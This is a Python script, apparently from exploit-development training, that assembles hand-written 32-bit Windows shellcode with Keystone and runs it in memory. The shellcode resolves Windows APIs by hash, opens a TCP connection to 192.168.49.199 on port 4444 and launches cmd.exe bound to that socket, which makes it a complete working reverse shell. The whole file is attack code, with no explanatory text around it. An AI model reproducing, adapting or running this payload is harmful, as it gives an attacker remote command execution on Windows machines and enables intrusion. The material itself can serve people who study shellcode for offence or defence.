import keystone
import ctypes

asm = """
start:
    int3
    mov ebp, esp
    # sub esp, 0x610
    add esp, 0xfffff9f0

find_kernel32:
    # ECX = 0
    xor ecx, ecx
    # ESI = &(PEB) ([FS:0x30])
    mov esi, fs:[ecx+30h]
    # ESI = PEB->Ldr
    mov esi, [esi+0Ch]
    # ESI = PEB->Ldr.InInitOrder
    mov esi, [esi+1Ch]

next_module:
    # EBX = InInitOrder[X].base_address
    mov ebx, [esi+8h]
    # EDI = InInitOrder[X].module_name
    mov edi, [esi+20h]
    # ESI = InInitOrder[X].flink
    mov esi, [esi]
    # (unicode) modulename[12] == 0x00?
    cmp [edi+12*2], cx
    # No: try next module
    jne next_module

find_function_shorten:
    jmp find_function_shorten_bnc

find_function_ret:
    pop esi
    mov [ebp+0x04], esi
    jmp resolve_symbols_kernel32

find_function_shorten_bnc:
    call find_function_ret

find_function:
    # Save all registers
    pushad
    # Base address of kernel32 is in EBX from previous step (find_kernel32)
    # Offset to PE signature
    mov eax, [ebx+0x3c]
    # Export table directory RVA
    mov edi, [ebx+eax+0x78]
    # Export table directory VMA
    add edi, ebx
    # NumberOfNames
    mov ecx, [edi+0x18]
    # AddressOfNames RVA
    mov eax, [edi+0x20]
    # AddressOfNames VMA
    add eax, ebx
    # Save AddressOfNames VAM for later
    mov [ebp-4], eax

find_function_loop:
    # Jump to the end if ECX is 0
    jecxz find_function_finished
    # Decrement our names counter
    dec ecx
    # Restore AddressOfNames VMA
    mov eax, [ebp-4]
    # Get the RVA of the symbol name
    mov esi, [eax+ecx*4]
    # Set ESI to the VMA of the current symbol name
    add esi, ebx

compute_hash:
    # Null EAX
    xor eax, eax
    # Null EDX
    cdq
    # Clear direction
    cld

compute_hash_again:
    # Load the next byte from ESI into AL
    lodsb
    # Check for null terminator
    test al, al
    # If the ZF is set, we've hit the null terminator
    jz find_function_compare
    # Rotate EDX 13 bits to the right
    ror edx, 0x0d
    # Add the new byte to the accumulator
    add edx, eax
    # Next iteration
    jmp compute_hash_again

find_function_compare:
    # Compare the computed hash with the requested hash
    cmp edx, [esp+0x24]
    # If it doesn't match, go back to find_function_loop
    jnz find_function_loop
    # AddressOfNameOrdinals RVA
    mov edx, [edi+0x24]
    # AddressOfNameOrdinals VMA
    add edx, ebx
    # Extrapolate the function's ordinal
    mov cx, [edx+2*ecx]
    # AddressOfFunctions RVA
    mov edx, [edi+0x1c]
    # AddressOfFunctions VMA
    add edx, ebx
    # Get the function RVA
    mov eax, [edx+4*ecx]
    # Get the function VMA
    add eax, ebx
    # Overwrite stack version of eax from pushad
    mov [esp+0x1c], eax

find_function_finished:
    # Restore registers
    popad
    ret

resolve_symbols_kernel32:
    # TerminateProcess hash
    push 0x78b5b983
    # Call find_function
    call dword ptr [ebp+0x04]
    # Save TerminateProcess address for later usage
    mov [ebp+0x10], eax
    # LoadLibraryA hash
    push 0xec0e4e8e
    # Call find_function
    call dword ptr [ebp+0x04]
    # Save LoadLibraryA address for later usage
    mov [ebp+0x14], eax
    # CreateProcessA hash
    push 0x16b3fe72
    # Call find_function
    call dword ptr [ebp+0x04]
    # Save CreateProcessA address for later usage
    mov [ebp+0x18], eax

load_ws2_32:
    # Null EAX
    xor eax, eax
    # Move the end of the string in AX
    mov ax, 0x6c6c
    # Push EAX on the stack with string null terminator
    push eax
    # Push part of the string on the stack
    push 0x642e3233
    # Push another part of the string on the stack
    push 0x5f327377
    # Push ESP to have a pointer to the string
    push esp
    # Call LoadLibraryA
    call dword ptr [ebp+0x14]

resolve_symbols_ws2_32:
    # Move the base address of ws2_32.dll to EBX
    mov ebx, eax
    # WSAStartup hash
    push 0x3bfcedcb
    # Call find_function
    call dword ptr [ebp+0x04]
    # Save WSAStartup address for later usage
    mov [ebp+0x1c], eax
    # WSASocketA hash
    push 0xadf509d9
    # Call find_function
    call dword ptr [ebp+0x04]
    # Save WSASocketA address for later usage
    mov [ebp+0x20], eax
    # WSAConnect hash
    push 0xb32dba0c
    # Call find_function
    call dword ptr [ebp+0x04]
    # Save WSAConnect address for later usage
    mov [ebp+0x24], eax

call_wsa_startup:
    # Move ESP to EAX
    mov eax, esp
    # Move 0x590 to CX
    mov cx, 0x590
    # Subtract CX from EAX to avoid overwriting the structure later
    sub eax, ecx
    # Push lpWSAData
    push eax
    # Null EAX
    xor eax, eax
    # Move version to AX
    mov ax, 0x0202
    # Push wVersionRequired
    push eax
    # Call WSAStartup
    call dword ptr [ebp+0x1c]

call_wsasocketa:
    # Null EAX
    xor eax, eax
    # Push dwFlags
    push eax
    # Push g
    push eax
    # Push lpProtocolInfo
    push eax
    # Move AL, IPPROTO_TCP
    mov al, 0x06
    # Push protocol
    push eax
    # Subtract 0x05 from AL, AL = 0x01
    sub al, 0x05
    # Push type
    push eax
    # Increase EAX, EAX = 0x02
    inc eax
    # Push af
    push eax
    # Call WSASocketA
    call dword ptr [ebp+0x20]

call_wsaconnect:
    # Move the SOCKET descriptor to ESI
    mov esi, eax
    # Null EAX
    xor eax, eax
    # Push sin_zero[]
    push eax
    # Push sin_zero[]
    push eax
    # Push sin_addr (192.168.49.199)
    push 0xc731a8c0
    # Move the sin_port (4444) to AX
    mov ax, 0x5c11
    # Left shift EAX by 0x10 bytes
    shl eax, 0x10
    # Add 0x02 (AF_INET) to AX
    add ax, 0x02
    # Push sin_port & sin_family
    push eax
    # Push pointer to the sockaddr_in structure
    push esp
    # Store pointer to sockaddr_in in EDI
    pop edi
    # Null EAX
    xor eax, eax
    # Push lpGQOS
    push eax
    # Push lpSQOS
    push eax
    # Push lpCalleeData
    push eax
    # Push lpCallerData
    push eax
    # Set AL to 0x10
    add al, 0x10
    # Push namelen
    push eax
    # Push *name
    push edi
    # Push s
    push esi
    # Call WSASocketA
    call dword ptr [ebp+0x24]

create_startupinfoa:
    # Push hStdError
    push esi
    # Push hStdOutput
    push esi
    # Push hStdInput
    push esi
    # Null EAX
    xor eax, eax
    # Push lpReserved2
    push eax
    # Push cbReserved2 & wShowWindow
    push eax
    # Mov 0x80 to AL
    mov al, 0x80
    # Null ECX
    xor ecx, ecx
    # Mov 0x80 to CL
    mov cl, 0x80
    # Mov 0x80 to CX
    add eax, ecx
    # Push dwFlags
    push eax
    # Null EAX
    xor eax, eax
    # Push dwFillAttribute
    push eax
    # Push dwYCountChars
    push eax
    # Push dwXCountChars
    push eax
    # Push dwYSize
    push eax
    # Push dwXSize
    push eax
    # Push dwY
    push eax
    # Push dwX
    push eax
    # Push lpTitle
    push eax
    # Push lpDesktop
    push eax
    # Push lpReserved
    push eax
    # Move 0x44 to AL
    mov al, 0x44
    # Push cb
    push eax
    # Push pointer to the STARTUPINFOA structure
    push esp
    # Store pointer to STARTUPINFOA in EDI
    pop edi

create_cmd_string:
    # Move 0xff9a879b into EAX
    mov eax, 0xff9a879b
    # Negate EAX, EAX = 00657865
    neg eax
    # Push part of the "cmd.exe" string
    push eax
    # Push the remainder of the "cmd.exe" string
    push 0x2e646d63
    # Push pointer to the "cmd.exe" string
    push esp
    # Store pointer to the "cmd.exe" string in EBX
    pop ebx

call_createprocessa:
    # Move ESP to EAX
    mov eax, esp
    # Null ECX
    xor ecx, ecx
    # Move 0x390 to CX
    mov cx, 0x390
    # Subtract CX from EAX to avoid overwriting the structure later
    sub eax, ecx
    # Push lpProcessInformation
    push eax
    # Push lpStartupInfo
    push edi
    # Null EAX
    xor eax, eax
    # Push lpCurrentDirectory
    push eax
    # Push lpEnvironment
    push eax
    # Push dwCreationFlags
    push eax
    # Increase EAX, EAX = 0x01 (TRUE)
    inc eax
    # Push bInheritHandles
    push eax
    # Null ECX
    dec eax
    # Push lpThreadAttributes
    push eax
    # Push lpProcessAttributes
    push eax
    # Push lpCommandLine
    push ebx
    # Push lpApplicationName
    push eax
    # Call CreateProcessA
    call dword ptr [ebp+0x18]

exec_shellcode:
    # Null ECX
    xor ecx, ecx
    # uExitCode
    push ecx
    # hProcess
    push 0xffffffff
    # Call TerminateProcess
    call dword ptr [ebp+0x10]
"""

# Initialize engine in X86-32bit mode
ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)

encoding, count = ks.asm(asm)
print(f"Encoded {count} instructions ...")
shellcode = bytearray(encoding)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

print(f"Shellcode located at address {hex(ptr)}")
input("... ENTER TO EXECUTE SHELLCODE ...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
